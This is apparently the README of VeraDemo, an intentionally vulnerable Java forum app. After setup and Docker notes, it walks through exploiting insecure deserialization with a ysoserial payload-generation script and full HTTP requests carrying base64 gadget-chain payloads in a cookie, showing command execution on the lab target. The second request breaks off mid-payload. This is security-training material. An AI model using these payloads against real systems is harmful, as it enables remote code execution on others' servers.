# VeraDemo - Blab-a-Gag

<!-- TOC -->

-   [VeraDemo - Blab-a-Gag](#verademo---blab-a-gag)
    -   [About](#about)
        -   [URLs](#urls)
    -   [Build](#build)
    -   [Configure](#configure)
        -   [Database](#database)
    -   [Run](#run)
    -   [AWS Deployment](#aws-deployment)
    -   [Exploitation Demos](#exploitation-demos)
-   [Docker notes](#docker-notes)
-   [Deserialization Exploit with Ysoserial](#deserialization-exploit-with-ysoserial)
    -   [Generate different payloads](#generate-different-payloads)
    -   [Successful exploitation with CommonsCollections2](#successful-exploitation-with-commonscollections2)
    -   [Successful exploitation with CommonsCollections4](#successful-exploitation-with-commonscollections4)

<!-- /TOC -->

## About

Blab-a-Gag is a fairly simple forum type application which allows:

-   users to post a one-liner joke
-   users to follow the jokes of other users or not (listen or ignore)
-   users to comment on other users messages (heckle)

### URLs

`/reset` will reset the data in the database with a load of:

-   users
-   jokes
-   heckles

`/feed` shows the jokes/heckles that are relevant to the current user.

`/blabbers` shows a list of all other users and allows the current user to listen or ignore.

`/profile` allows the current user to modify their profile.

`/login` allows you to log in to your account

`/register` allows you to create a new user account

`/tools` shows a tools page that shows a fortune or lets you ping a host.

## Build

To build Verademo [Maven](https://maven.apache.org) is required.

`mvn package` will build the web application and output a war file to `target/verademo.war`. This war file can be uploaded to Veracode for static analysis.

## Configure

To run Verademo [MySQL](https://www.mysql.com/) and [Tomcat](https://tomcat.apache.org/) are required.

The simplest way to aquire these on MacOS is via [Homebrew](http://brew.sh/). Install Homebrew then:

    brew install mysql tomcat

### Database

Set up a database in MySQL called `blab` with a user of `blab` and password `z2^E6J4$;u;d`

## Run

Deploy the build output war file to Tomcat.

Open `/reset` in your browser and follow the instructions to prep the database

Login with a username/password as defined in `Utils.java`

## AWS Deployment

Verademo will also run out-of-the-box in AWS. Simply upload the `target/verademo.war` file into a Tomcat Elastic Beanstalk environment (with associated Amazon RDS). The database credentials listed above are not required when running in AWS.

On the first environment deployment, a script will automatically setup the database. Subsequent application re-deploys (without environment re-deploy), or application server restarts will not alter the database.

## Exploitation Demos

See the `docs` folder

# Docker notes

```bash
# Download code
host$ git clone https://github.com/jourzero/verademo.git

host$ cd verademo

# Build image
host$ docker build -t verademo .

Sending build context to Docker daemon  44.32MB
Step 1/8 : FROM tomcat:latest
[...]
Step 8/8 : CMD /app/utils/entrypoint.sh
[...]
Successfully tagged verademo:latest

# Start container which starts mariadb, initializes the DB and starts tomcat
host$ ./docker-run.sh
Starting container verademo... To use the app, browse to http://127.0.0.1:4080/verademo

-- Starting mariadb...
[ ok ] Starting MariaDB database server: mysqld.
[...]

-- Initializing the DB...

-- Starting Tomcat...
[...]

-- Tailing the tomcat log...
[...]
05-Dec-2020 18:05:25.764 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [7249] milliseconds

```

# Deserialization Exploit with Ysoserial

The below shows how the insecure deserialization issue found in [Veracode Pipeline Scan](veracode-pipeline-scan-results.json#L563) could be exploited. The [Veracode Agent-Based SCA](https://github.com/jourzero/verademo/blob/master/veracode-sca-results.json#L2748) results are also quite useful to explain the issue:

> Potential Remote Code Execution Via Java Object Deserialization ([CVE-2015-4852](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852)): Apache Commons includes a class called InvokerTransformer. An application is vulnerable to a deserialization attack if this class is available on the classpath and the application deserializes untrusted or user-supplied data. It's not necessary to actually use InvokerTransfomer to be vulnerable. With these two criteria satisfied, an attacker may construct a gadget chain using classes in the component to execute arbitrary code. The chain relies on the class InvokerTransformer in the org.apache.commons.collections.functors package to invoke methods during the deserialization process. The fix prevents deserialization of InvokerTransformer by default unless it's specifically enabled. CVE-2015-4852, CVE-2015-6420, CVE-2015-7501, and CVE-2015-7450 are all related to this artifact.

## Generate different payloads

First we use [ysoserial](https://github.com/frohoff/ysoserial) to generate payloads for a Remote Command Execution (RCE) attack, hoping that some gadgets will existing in the app's classpath. The attack will simply attempt to execute `touch /tmp/PAYLOAD_NAME` on the target.

```bash
$ cat gen-payloads.sh
#!/bin/bash
PAYLOAD_LIST="BeanShell1 C3P0 Clojure CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 FileUpload1 Groovy1 Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JRMPListener JSON1 JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 Spring2 URLDNS Vaadin1 Wicket1"
for payload in $PAYLOAD_LIST;do
    command="touch /tmp/$payload"
    filename="data/${payload}.bin"
    echo "-- Generating payload file $filename"
    java -jar ysoserial.jar $payload "$command"> "$filename"
done

# Show the payloads for Commons Collections (often reliable)
$ ls CommonsCollections*.bin
CommonsCollections1.bin CommonsCollections3.bin CommonsCollections5.bin
CommonsCollections2.bin CommonsCollections4.bin CommonsCollections6.bin

# Encode them in Base64 because the vulnerable code deserializes the cookie value from Base64
$ for i in CommonsCollections*; do cat $i | base64 > $i.b64; done

$ ls CommonsCollections*.b64
CommonsCollections1.bin.b64 CommonsCollections3.bin.b64 CommonsCollections5.bin.b64
CommonsCollections2.bin.b64 CommonsCollections4.bin.b64 CommonsCollections6.bin.b64
```

## Successful exploitation with CommonsCollections2

After a few attempt, we determined that the CommonsCollections2 payload was successful for RCE (via "rO0..." injected in the cookie).

Here's an example attack (don't worry about HTTP 500):

```http
=======http://verademo.me:4080/verademo/login?target=profile======
===REQUEST===
GET /verademo/login?target=profile HTTP/1.1
Host: verademo.me:4080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://verademo.me:4080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://verademo.me:4080/verademo/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=09BDD964B92EABC98F9BEF6176B42E73; username=john; user="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGtMr+ur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAB50b3VjaCAvdG1wL0NvbW1vbnNDb2xsZWN0aW9uczIIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMTM4NzM4MzUzODAxNzQBACBMeXNvc2VyaWFsL1B3bmVyMTEzODczODM1MzgwMTc0OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC4ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADMADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADcADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AGAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA7AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
Connection: close


===

===RESPONSE===
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=C2B51A4B5ECB9AEB8A5131857BB0BCC0; Path=/verademo; HttpOnly
Content-Type: text/html;charset=utf-8
Content-Language: en
Date: Wed, 09 Dec 2020 04:38:15 GMT
Connection: close
Content-Length: 11757

<!doctype html><html lang="en"><head><title>HTTP Status 500 â Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 â Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Request processing failed; nested exception is org.apache.commons.collections4.FunctorException: InvokerTransformer: The method 'newTransformer' on 'class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' threw an exception</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b> <pre>org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.apache.commons.collections4.FunctorException: InvokerTransformer: The method 'newTransformer' on 'class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' threw an exception
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:982)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>org.apache.commons.collections4.FunctorException: InvokerTransformer: The method 'newTransformer' on 'class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' threw an exception
	org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:137)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>java.lang.reflect.InvocationTargetException
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:129)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>java.lang.NullPointerException
	com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372)
	com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:456)
	com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:129)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/7.0.107</h3></body></html>
===

# On the target, we can see that the execution of "mkdir /tmp/CommonsCollections2" was successful:
root@8174f335c3a6:/tmp# ls
CommonsCollections2  hsperfdata_root
```

## Successful exploitation with CommonsCollections4

After a few attempt, we determined that the CommonsCollections4 payload was also successful for RCE (via "rO0..." injected in the cookie):

```http
=======http://verademo.me:4080/verademo/login?target=profile======
===REQUEST===
GET /verademo/login?target=profile HTTP/1.1
Host: verademo.me:4080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://verademo.me:4080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://verademo.me:4080/verademo/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=09BDD964B92EABC98F9BEF6176B42E73; username=john; user="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABrTK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlE